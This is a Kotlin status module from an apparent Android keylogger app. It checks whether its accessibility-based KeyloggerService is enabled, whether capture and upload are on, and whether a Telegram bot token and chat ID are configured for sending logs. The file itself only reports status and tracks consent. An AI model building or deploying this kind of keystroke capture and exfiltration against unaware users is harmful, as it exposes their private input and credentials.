package com.bshu2.androidkeylogger.data

import android.content.Context
import android.provider.Settings
import com.bshu2.androidkeylogger.KeyloggerService
import com.bshu2.androidkeylogger.Prefs
import com.bshu2.androidkeylogger.UploadPipeline

/**
 * Two-level truth: the OS decides whether the accessibility service is bound,
 * the app decides whether capture is enabled. The master switch is only
 * meaningful when the first is true, so they are reported separately.
 */
data class StatusSnapshot(
    val consented: Boolean,
    val serviceEnabled: Boolean,
    val captureEnabled: Boolean,
    val uploadEnabled: Boolean,
    val destinationConfigured: Boolean,
    val lastUploadAt: Long,
) {
    /** Capture actually running: consented, service bound, and the switch on. */
    val captureActive: Boolean
        get() = consented && serviceEnabled && captureEnabled
}

object StatusRepository {

    fun snapshot(context: Context): StatusSnapshot {
        val consented = Prefs.hasConsent(context)
        return StatusSnapshot(
            consented = consented,
            serviceEnabled = serviceEnabled(context),
            captureEnabled = Prefs.captureEnabled(context),
            uploadEnabled = Prefs.uploadEnabled(context),
            destinationConfigured = Prefs.botToken(context).isNotEmpty() &&
                Prefs.chatId(context).isNotEmpty(),
            lastUploadAt = Prefs.lastRunAt(context),
        )
    }

    /**
     * Reads the live OS binding, not the app flag. The setting is a
     * colon-separated list such as
     * `com.pkg/com.pkg.KeyloggerService` or `com.pkg/.KeyloggerService`.
     */
    fun serviceEnabled(context: Context): Boolean {
        val flat = Settings.Secure.getString(
            context.contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES,
        ) ?: return false
        val full = context.packageName + "/" + KeyloggerService::class.java.name
        val short = context.packageName + "/." + KeyloggerService::class.java.simpleName
        return flat.split(':').any {
            it.equals(full, ignoreCase = true) || it.equals(short, ignoreCase = true)
        }
    }

    fun logDir(context: Context) = UploadPipeline.logDir(context)
}